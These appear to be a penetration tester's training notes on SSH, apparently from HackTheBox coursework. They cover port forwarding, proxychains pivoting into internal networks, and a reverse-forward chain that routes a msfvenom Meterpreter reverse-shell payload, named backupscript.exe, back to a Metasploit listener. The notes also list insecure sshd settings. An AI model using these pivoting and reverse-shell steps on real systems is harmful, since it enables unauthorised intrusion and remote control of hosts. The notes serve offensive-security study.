Port: 22
Config file: `/etc/ssh/sshd_config`

# Port Forwarding
## Local Port Forwarding
The `-L` flag tells the SSH client to request the SSH server to forward all the data we send via the port `<INTERNAL-PORT>` to `localhost:<REMOTE-SYSTEM-PORT>`
```shell-session
$ ssh -L <INTERNAL-PORT>:localhost:<REMOTE-SYSTEM-PORT> <USER>@<IP>
$ ssh -L 1234:localhost:3306 -L 8080:localhost:80 ubuntu@10.129.202.64
```
With this we can, for example, scan internal ports which would have been otherwise inaccessible from our base system:
```shell-session
$ nmap -sCV -p <INTERNAL-PORT> localhost
```
## Dynamic Port Forwarding
If the remote system has additional NICs and connected to other networks, we can't perform scans directly as our system does not know that network path. We can start a #SOCKS listener on our local host and then configure SSH to forward that traffic via SSH to the network (for e.g. 172.16.5.0/23) after connecting to the target host
1. Enable SOCKS listener in `/etc/proxychains.conf`:
```shell-session
$ tail -1 /etc/proxychains.conf
socks4 	127.0.0.1 <LOCAL-PORT>
```
2. Forward all data from the `LOCAL-PORT` via SSH client to remote system:
```shell-session
$ ssh -D <LOCAL-PORT> <USER>@<IP>
```
3. Run commands through remote system via attacking host through #proxychains to access internal networks remotely:
```shell-session
$ proxychains <COMMAND>
$ proxychains nmap -v -sn 172.16.5.1-200
```
## Reverse Port Forwarding
The `-R` flag asks the Ubuntu server to listen on `<targetIPaddress>:8080` and forward all incoming connections on port `8080` to our msfconsole listener on `0.0.0.0:8000` of our `attack host`.
To get a reverse shell from, let's say a remote Windows system on a different network from pivot Ubuntu system, we could create a Meterpreter HTTPS payload using `msfvenom`, but the `LHOST` would be Ubuntu server's host IP address (`172.16.5.129`). We will use port 8080 on Ubuntu server to forward all of our reverse packets to our attack hosts' 8000 port, where our Metasploit listener is running.
1. Create HTTPS Payload
```shell-session
1zverg@htb[/htb]$ msfvenom -p windows/x64/meterpreter/reverse_https lhost= <InternalIPofPivotHost> -f exe -o backupscript.exe LPORT=8080
```
2. Configure & Start the multi/handler
```shell-session
msf6 > use exploit/multi/handler
msf6 exploit(multi/handler) > set payload windows/x64/meterpreter/reverse_https
msf6 exploit(multi/handler) > set lhost 0.0.0.0
msf6 exploit(multi/handler) > set lport 8000
msf6 exploit(multi/handler) > run

[*] Started HTTPS reverse handler on https://0.0.0.0:8000
```
3. [[File Transfer|Transfer]] payload from attacking host to remote Ubuntu to remoter Windows
4. SSH Remote Port Forward From `Ubuntu:8080` to `MSF:8000`
```shell-session
1zverg@htb[/htb]$ ssh -R <InternalIPofPivotHost>:8080:0.0.0.0:8000 ubuntu@<ipAddressofTarget> -vN
```
5. Execute the payload on remoter Windows host and wait for a connection in MSF.
>Our Meterpreter session should list the incoming connection being from a local host itself (`127.0.0.1`) since we are receiving the connection over the `local SSH socket`, which created an `outbound` connection to the Ubuntu server. Issuing the `netstat` command can show us that the incoming connection is from the SSH service.
### Useful Flags
- `-N`: Do not prompt the login shell.
# Dangerous Settings
| **Setting**                  | **Description**                             |
| ---------------------------- | ------------------------------------------- |
| `PasswordAuthentication yes` | Allows password-based authentication.       |
| `PermitEmptyPasswords yes`   | Allows the use of empty passwords.          |
| `PermitRootLogin yes`        | Allows to log in as the root user.          |
| `Protocol 1`                 | Uses an outdated version of encryption.     |
| `X11Forwarding yes`          | Allows X11 forwarding for GUI applications. |
| `AllowTcpForwarding yes`     | Allows forwarding of TCP ports.             |
| `PermitTunnel`               | Allows tunneling.                           |
| `DebianBanner yes`           | Displays a specific banner when logging in. |
# Tips
## Accepted Authentication
use `-v` to check:
```bash
ssh -v cry0l1t3@10.129.14.132

OpenSSH_8.2p1 Ubuntu-4ubuntu0.3, OpenSSL 1.1.1f  31 Mar 2020
debug1: Reading configuration data /etc/ssh/ssh_config 
...SNIP...
debug1: Authentications: publickey,password,keyboard-interactive
```
## Preferred Authentication
use `PreferredAuthentications=<help-above>` 
# Tools
- [[SSH-Audit]]
- [[MSFConsole#Modules#SSH User Enumeration|Metasploit - SSH User Enumeration]]